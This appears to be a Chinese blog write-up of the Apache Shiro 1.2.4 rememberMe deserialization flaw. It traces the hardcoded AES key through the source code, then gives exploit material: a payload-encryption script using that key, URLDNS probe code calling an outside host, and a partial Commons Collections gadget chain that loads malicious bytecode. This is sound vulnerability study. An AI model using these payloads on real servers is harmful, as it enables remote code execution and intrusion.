<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代码使用<strong>serialize</strong>方法将<strong>PrincipalCollection</strong>对象进行序列化操作，并将序列化后得到的字节数组保存在<strong>bytes</strong>变量中</p>
<p>如果<strong>CipherService</strong>对象不为空，则调用<strong>encrypt</strong>方法对字节数组进行加密操作，并将加密后的结果更新到<strong>bytes</strong>变量中并返回</p>
<h4 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h4><p>看一下<strong>encrypt</strong>方法做了什么</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="type">byte</span>[] value = serialized;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个代码中会先获取<strong>CipherService</strong>对象，然后调用该对象的加密方法，将字节数组和加密密钥作为参数</p>
<p>最重要的是<strong>getEncryptionCipherKey</strong>函数，这是一个获取密钥的函数，直接返回变量</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getEncryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到<strong>encryptionCipherKey</strong>是一个常量</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] encryptionCipherKey;</span><br></pre></td></tr></table></figure></div>

<p>可以看到变量是在<strong>setEncryptionCipherKey</strong>方法中被写入的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEncryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] encryptionCipherKey)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而<strong>setEncryptionCipherKey</strong>是在<strong>setCipherKey</strong>中被调用的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在看一下是哪里调用了<strong>setEncryptionCipherKey</strong>，找到了<strong>AbstractRememberMeManager</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这是个固定值</p>
<p>也就是说在<strong>Shiro1.2.4</strong>中，它所有跟<strong>remenber</strong>相关的加密是用一个固定的<strong>key</strong>去加密的</p>
<p>然后使用的算法是<strong>AES</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The following Base64 string was generated by auto-generating an AES Key:</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * AesCipherService aes = new AesCipherService();</span></span><br><span class="line"><span class="comment"> * byte[] key = aes.generateNewKey().getEncoded();</span></span><br><span class="line"><span class="comment"> * String base64 = Base64.encodeToString(key);</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> * The value of &#x27;base64&#x27; was copied-n-pasted here:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="onSuccessfulLogin"><a href="#onSuccessfulLogin" class="headerlink" title="onSuccessfulLogin"></a>onSuccessfulLogin</h3><p>反过来，我们去找找是在哪里调用了<strong>rememberIdentity</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    forgetIdentity(subject);</span><br><span class="line">    <span class="comment">//now save the new identity:</span></span><br><span class="line">    <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">        rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先这段代码调用<strong>forgetIdentity</strong>方法，清除之前保存的身份信息，以保证该用户每次登录时都有最新的身份信息。</p>
<p>接着，代码判断当前用户是否选择了<strong>RememberMe”<strong>选项。如果选择了，则调用</strong>rememberIdentity</strong>方法，将用户的身份信息、认证令牌和认证信息保存到身份验证器中。这样，当用户下次访问时，就可以通过已保存的身份信息进行快速登录操作。</p>
<p>至此整个加密过程即是</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">onSuccessfulLogin() -&gt; rememberIdentity() -&gt; rememberSerializedIdentity()</span><br></pre></td></tr></table></figure></div>



<h2 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h2><h3 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h3><p>要找<strong>Cookie</strong>的解密过程，直接在<strong>IDEA</strong>里面全局搜索<strong>Cookie</strong>，去找<strong>Shiro</strong>包里的类</p>
<p>最后找到相关的类是<strong>CookieRememberMeManager</strong>，锁定到**getRememberedSerializedIdentity()**这个方法上。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">    <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在这个方法中，先判断是否为<strong>servlet</strong>请求</p>
<p>如果是的话，再根据传入的<strong>subjectContext</strong>对象来获取<strong>Cookie</strong>中的<strong>remenberMe</strong>的值</p>
<p>然后判断是否是<strong>deleteMe</strong>，不是则存储到<strong>base64</strong>变量中</p>
<p>如果<strong>base64</strong>不为空，则判断<strong>base64</strong>的编码长度，再对其进行<strong>base64</strong>解码为字节数组，将解码结果返回；反之，返回null</p>
<h3 id="getRememberedPrincipals"><a href="#getRememberedPrincipals" class="headerlink" title="getRememberedPrincipals"></a>getRememberedPrincipals</h3><p>接着找到在<strong>getRememberedPrincipals</strong>中调用了<strong>getRememberedSerializedIdentity</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在这个代码中，先调用了<strong>getRememberedSerializedIdentity</strong>方法，传入<strong>SubjectContext</strong>对象，用来获取<strong>rememberMe</strong>的字节数组</p>
<p>如果字节数组不为<strong>null</strong>且大于<strong>0</strong>，则调用<strong>convertBytesToPrincipals()<strong>方法将字节数组转换成</strong>PrincipalCollection</strong>类型的对象</p>
<h4 id="convertBytesToPrincipals"><a href="#convertBytesToPrincipals" class="headerlink" title="convertBytesToPrincipals"></a>convertBytesToPrincipals</h4><p>在来看一下<strong>convertBytesToPrincipals</strong>的作用是什么</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先判断是否有<strong>CipherService(加密服务)<strong>，如果存在的话则调用</strong>decrypt</strong>方法对字节数组进行解密</p>
<p>接着在调用<strong>deserialize</strong>方法对解密后的字节数组进行反序列化</p>
<h4 id="deserialize"><a href="#deserialize" class="headerlink" title="deserialize"></a>deserialize</h4><p>先来看一下<strong>deserialize</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到代码创建一个<strong>ClassResolvingObjectInputStream</strong>对象<strong>ois</strong>，并将<strong>BufferedInputStream</strong>对象<strong>bis</strong>作为其构造参数</p>
<p>然后在使用<strong>ois</strong>调用<strong>readObject</strong>方法，将字节数组反序列化为对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">getRememberedIdentity</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">RememberMeManager</span> <span class="variable">rmm</span> <span class="operator">=</span> getRememberMeManager();</span><br><span class="line">    <span class="keyword">if</span> (rmm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Delegate RememberMeManager instance of type [&quot;</span> + rmm.getClass().getName() +</span><br><span class="line">                        <span class="string">&quot;] threw an exception during getRememberedPrincipals().&quot;</span>;</span><br><span class="line">                log.warn(msg, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h4><p>再来看一下<strong>decrypt</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在看一下解密方法，发现是一个接口，里面存放了<strong>加密字段</strong>和一个<strong>key</strong>，试着看一下能不能找到<strong>key</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] encrypted, <span class="type">byte</span>[] decryptionKey)</span> <span class="keyword">throws</span> CryptoException;</span><br></pre></td></tr></table></figure></div>

<p>在看一下<strong>getDecryptionCipherKey</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getDecryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再看一下<strong>decryptionCipherKey</strong>，发现是一个常量</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] decryptionCipherKey;</span><br></pre></td></tr></table></figure></div>

<p>找一下是在哪里赋值的，关注<strong>Value write</strong>即可</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDecryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] decryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着看一下哪里调用了<strong>setDecryptionCipherKey</strong>，找到<strong>setCipherKey</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在看一下是哪里调用了<strong>setCipherKey</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>到这里跟上面的加密流程其实差不多了</p>
<h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="AES加密脚本"><a href="#AES加密脚本" class="headerlink" title="AES加密脚本"></a>AES加密脚本</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_bin</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS=AES.block_size</span><br><span class="line">    pad=<span class="keyword">lambda</span> s:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode=AES.MODE_CBC</span><br><span class="line">    iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor=AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data=convert_bin(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_enc(data))</span><br></pre></td></tr></table></figure></div>

<h2 id="URLDNS漏洞探测"><a href="#URLDNS漏洞探测" class="headerlink" title="URLDNS漏洞探测"></a>URLDNS漏洞探测</h2><p>通过漏洞原理可以知道，构造<strong>Payload</strong>需要将利用链通过<strong>AES</strong>加密后在<strong>base64</strong>编码。将<strong>Payload</strong>的值设置为<strong>rememberMe</strong>的<strong>cookie</strong>值由于<strong>URLDNS</strong>不依赖于<strong>Commons Collections</strong>包，只需要<strong>JDK</strong>的包就行，所有一般用于<strong>检测是否存在漏洞</strong>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://sdkhkszqkc.dgrh3.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射来获取hashCode并修改值</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">forName</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> forName.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">declaredField.set(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将hashCode的值改回-1</span></span><br><span class="line">declaredField.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">serialize(hashMap);</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h2><p>这里添加的是<strong>Commons-Collections-3.2.1</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>直接使用<strong>CC链</strong><code>(这里使用CC6)</code>去打的话，会爆出一个<strong>ClassNotFoundException</strong>，具体报错信息是</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Unable to load clazz named [[Lorg.apache.commons.collections.Transformer;] from <span class="keyword">class</span> <span class="title class_">loader</span> [ParallelWebappClassLoader</span><br></pre></td></tr></table></figure></div>

<p>意味着在<strong>Tomcat</strong>中的某个<strong>Web</strong>应用程序中，无法加载名为<strong>org.apache.commons.collections.Transformer</strong>的数组类，具体来说是一个<strong>Transformer</strong>对象的数组类。</p>
<p>那么我们就不让代码中出现数组类即可，所以我们可以使用动态加载恶意类的方法</p>
<p>首先创建<strong>TemplatesImpl</strong>对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC3</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure></div>

<p>然后利用<strong>InvokerTransformer</strong>去调用<strong>newTransformer</strong>方法</p>
